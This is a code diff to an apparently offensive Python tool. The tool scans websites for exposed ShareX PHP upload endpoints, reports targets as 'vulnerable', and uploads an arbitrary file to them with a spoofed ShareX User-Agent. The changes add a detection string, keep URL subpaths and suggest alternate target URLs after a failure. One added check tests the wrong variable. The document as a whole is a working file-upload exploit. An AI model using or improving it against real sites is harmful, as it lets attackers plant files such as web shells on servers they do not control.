@@ -18,7 +18,7 @@ BANNER = fr''' {Fore.WHITE}_____     _     __ __{Fore.LIGHTBLACK_EX}
 '''
 
 ENDPOINTS = ('upload.php', 'up.php', 'sharex.php')
-KEYWORDS = ('File upload failed - CHMOD/Folder doesn\'t exist?', 'File not found.')
+KEYWORDS = ('File upload failed - CHMOD/Folder doesn\'t exist?', 'File not found.', 'No post data recieved')
 
 def print_error(a):
     print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTRED_EX}ERRO {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')
@@ -32,8 +32,10 @@ def print_info(a):
 def print_warning(a):
     print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTYELLOW_EX}WARN {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')
 
-def upload_file(url, endpoint, file_path, file_name, secret):
-    data = {'sharex': open(file_path, 'rb')}
+def upload_file(url, endpoint, file_path, file_name, secret=None):
+    with open(file_path, 'rb') as file:
+        content = file.read()
+    data = {'sharex': content}
     if secret:
         data.update({'secret': secret})
     return requests.post(url + '/' + endpoint, headers={'User-Agent': 'ShareX/13.1.0'}, files=data)
@@ -49,16 +51,30 @@ def get_endpoint(url):
     try:
         for endpoint in ENDPOINTS:
             res = requests.get(url + '/' + endpoint)
+            
             if res.text.strip() in KEYWORDS:
                 return endpoint
     except:
         pass
 
-def format_url(url):
+def format_url(url, with_path=True):
     group = url.split('/')
     protocol = group[0]
     domain = group[2]
-    return protocol + '//' + domain
+    path = ''
+    
+    if with_path:
+        if len(group) > 3:
+            for x in group[3:]:
+                if not x:
+                    continue
+                
+                if '.' in group:
+                    break
+                
+                path += '/' + x
+            
+    return protocol + '//' + domain + (path if len(path) > 0 else '')
 
 def validate_file(file):
     return os.path.exists(file) and os.path.isfile(file)
@@ -80,17 +96,17 @@ def main():
     args = parser.parse_args()
     
     # read arguments
-    target_url = args.url
+    url = args.url
     file_path = args.path
     secret = args.secret
 
     # print help if no arguments are given
-    if not target_url and not file_path and not secret:
+    if not url and not file_path and not secret:
         parser.print_help()
         exit()
 
     # handle mandatory arguments
-    if not target_url:
+    if not url:
         print_error('target url is not provided')
         exit()
 
@@ -99,7 +115,7 @@ def main():
         exit()
 
     # validate URL
-    if not validators.url(target_url):
+    if not validators.url(url):
         print_error('invalid url provided')
         exit()
 
@@ -109,8 +125,8 @@ def main():
         exit()
 
     # format URL
-    target_url = format_url(target_url)
-
+    target_url = format_url(url)
+    
     # check if target is online
     if not is_online(target_url):
         print_error('target is offline')
@@ -123,6 +139,9 @@ def main():
 
     if not endpoint:
         print_error('target is not vulnerable')
+        
+        if target_url.count('/') > 2:
+            print_info(f'try: {Fore.LIGHTMAGENTA_EX}{format_url(target_url, False)}{Fore.RESET} as target URL')
         exit()
 
     print_sucess(f'target seems vulnerable: {Fore.LIGHTMAGENTA_EX}{target_url}/{endpoint}')
@@ -149,6 +168,9 @@ def main():
         else:
             print_error(f'response code: {Fore.LIGHTMAGENTA_EX}{code}')
             print_error(f'response body: {Fore.LIGHTMAGENTA_EX}{res_body}')
+            
+        if code != 200 and target_url.count('/') > 2:
+            print_info(f'try: {Fore.LIGHTMAGENTA_EX}{format_url(target_url, False)}{Fore.RESET} as target URL')
 
     except Exception as e:
         _, _, exc_tb = sys.exc_info()
